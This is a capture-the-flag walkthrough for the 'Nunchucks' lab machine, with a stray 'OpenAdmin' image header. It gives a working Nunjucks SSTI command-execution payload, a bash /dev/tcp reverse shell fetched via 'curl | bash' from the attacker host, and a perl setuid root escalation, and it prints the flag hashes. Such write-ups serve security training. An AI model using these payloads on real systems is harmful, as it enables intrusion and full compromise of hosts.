![OpenAdmin.PNG](/assets/Machines/Easy/OpenAdmin/OpenAdmin.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.11.122
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.11.122
```
**Output**
```bash
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

3. Do virtual hosting with web page and look

![web.PNG](/assets/Machines/Easy/Nunchucks/web.PNG)

* Login and Sig up Modules are disables, in this case use vhost busting.

4. Use **vhost** to discover subdomains
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Nunchucks]
└─| wfuzz -c -t 200 --hc=404 --hh=30587 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb
```

**Output**
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"
```
* Put subdomain discover in `/etc/hosts`

5. Visit new web page

![web2.PNG](/assets/Machines/Easy/Nunchucks/web2.PNG)

* When you look a site like this you think in **SSTI Attack**
  
![informarion.PNG](/assets/Machines/Easy/Nunchucks/informarion.PNG)

* You use `{{range.constructor("return global.process.mainModule.require('child_process').execSync('<command>')")()}}` to execute commands

6. Test any command in Burpsuite

![test.PNG](/assets/Machines/Easy/Nunchucks/test.PNG)

* Command execute: `tail /etc/passwd`

7. Execute a command to get a reverse shell, in this we can obtain this of other way.

First, create a index.html in current folder and put this in the file
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.32/443 0>&1
```

---

Then, create a server with python in current folder
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Nunchucks]
└─| python -m http.server 80
```

---

Finally, execute this command `curl <tun0 IP> | bash`

* We do all previous process for avoid errors
* Remember listen with **nc** 

**Output**
```bash
david@nunchucks:/var/www/store.nunchucks$ whoami
david
```


8. Cat **user flag**
```bash
david@nunchucks:/var/www/store.nunchucks$ cat /home/david/user.txt 
455fe77f0e9cc9286871ae400f7eaf06
```

---
---
---

### Privileges Escalation 💀
1. Search all capabilities
```bash
david@nunchucks:/var/www/store.nunchucks$ getcap -r / 2>/dev/nul
```

**Output**
```bash
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

2. Try to change your UID

![cap.PNG](/assets/Machines/Easy/Nunchucks/cap.PNG)

* In this case the command not function.

3. Search files for SeLinux or AppArmor are security modules.
```bash
david@nunchucks:/var/www/store.nunchucks$ find / -name "apparmor" 2>/dev/null | grep -vE 'proc|var'
/usr/lib/apparmor
/usr/lib/python3/dist-packages/apparmor
/usr/share/apparmor
/usr/share/doc/apparmor
/usr/share/lintian/overrides/apparmor
/usr/src/linux-headers-5.4.0-86/security/apparmor
/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor
/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor
/usr/src/linux-headers-5.4.0-81/security/apparmor
/etc/apparmor
/etc/init.d/apparmor
/sys/kernel/security/apparmor
/sys/module/apparmor
```

* In this case the system have **AppArmor module**

4. Search vulnerabilities with perl AppArmor https://bugs.launchpad.net/apparmor/+bug/1911431

5. Exploit with previous vulnerability
* Bug is in use `#!/usr/bin/perl`
* Create a file with this perl script in `/tmp`
```perl
#!/usr/bin/perl

use POSIX qw(setuid); 
POSIX::setuid(0); 
exec "/bin/sh";
```

* Put execute permission and go!

**Output**
```bash
david@nunchucks:/tmp$ ./exploit.pl 
# whoami
root
```

6. Cat **root flag**
```bash
# cat /root/root.txt
0c0b3b3868bce3dc3c495aebf417c179
```